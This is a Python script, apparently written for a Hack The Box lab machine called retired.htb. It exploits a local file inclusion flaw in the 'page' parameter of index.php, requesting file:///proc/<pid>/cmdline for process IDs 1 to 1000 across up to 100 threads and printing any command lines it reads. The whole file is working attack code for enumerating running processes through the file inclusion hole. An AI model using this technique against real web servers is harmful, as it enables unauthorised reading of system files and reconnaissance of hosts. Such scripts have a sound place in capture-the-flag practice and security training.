import threading as th
import requests as req
import time, sys

#declared variables
pids_to_scan = 1000 + 1
thread_count = 0
threads_allowed = 100

#self crafting variables
procs = []
for proc in range(1, pids_to_scan):
    procs.append(proc)

#functions
def get_procs():
    global thread_count
    
    thread_count += 1
    
    pid = procs[0]
    procs.remove(pid)
    resp = req.get('http://retired.htb/index.php?page=file:///proc/'+str(pid)+'/cmdline')
    
    thread_count -= 1

    string = 'Id: '+str(pid)+'\nData: "'+resp.text+'"\n<'+('-'*60)+'>\n'

    if resp.text != '':
        print(string)
    #else:
        #remove this
        #print(string)


#main function
def main():
    start_ = time.time()
    while True:
        if len(procs) > 0:
            if thread_count < threads_allowed:
                thread = th.Thread(target=get_procs)
                thread.start()
                #thread.join()
        else:
            break
            
    '''
        complete = ((pid+1)/pids_to_scan)*100
        loader = int( ( int(complete) /100) * 60 )
        sys.stdout.write('\r')
        sys.stdout.write("[%-60s] %f%%" % ('='*loader, complete))
        sys.stdout.flush()'''

    #print('\n')
    thread.join()
    end_ = time.time()
    total_time = end_ - start_
    print('\nseconds: '+str(total_time))

#run the main function
if __name__ == "__main__":
    main()
    
